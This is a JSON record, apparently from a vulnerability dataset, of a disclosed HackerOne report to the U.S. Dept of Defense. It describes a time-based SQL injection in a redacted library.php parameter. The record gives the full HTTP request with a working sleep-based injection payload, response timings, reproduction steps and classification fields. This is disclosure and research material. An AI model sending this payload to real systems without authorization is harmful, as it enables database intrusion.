@@ -1,0 +1,42 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "testfortesttest ",
+    "title": "[SQLI ]Time Bassed Injection at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 via /\u2588\u2588\u2588\u2588\u2588\u2588/library.php?c=G14 parameter",
+    "content": "\nStep-by-step Reproduction Instructions\ncopy the request to your burp suite :\nCode 303 Bytes\n1GET /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\n3Accept-Encoding: gzip, deflate\n4Accept: */*\n5Accept-Language: en\n6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\n7Connection: close\nCode 67 Bytes\n1payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCode 67 Bytes\n1paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCode 67 Bytes\n1paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis\n\u2588\u2588\u2588\nThis issue is same to #995122\nImpact\nSQL Injection\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1606172820,
+    "report_url": "https://hackerone.com/reports/1024984",
+    "vuln_category": "WEB_APP",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "MEDIUM",
+    "steps": [
+        [
+            1,
+            "Copy the request to your Burp Suite: GET /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1"
+        ],
+        [
+            2,
+            "Observe the response time to confirm the time-based SQL injection (e.g., 2,077 millis for sleep(1*1), 4,599 millis for sleep(2*2))"
+        ]
+    ],
+    "vuln_description": "This is a time-based SQL injection vulnerability in the 'c' parameter of the /library.php endpoint. The attacker can inject malicious SQL queries that cause the database to delay its response, confirming the vulnerability based on the response time.",
+    "reason": "The attack involves a straightforward injection of a time-delay payload into a single parameter. The interaction is direct and does not require complex state manipulation or novel logic. The payload is a common pattern for time-based SQL injection.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "995122",
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating the 'c' parameter in the library.php endpoint to trigger time-based delays, which is a form of input manipulation rather than an authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, not on detecting input validation flaws like SQL injection.",
+        "is_detectable": false
+    }
+}
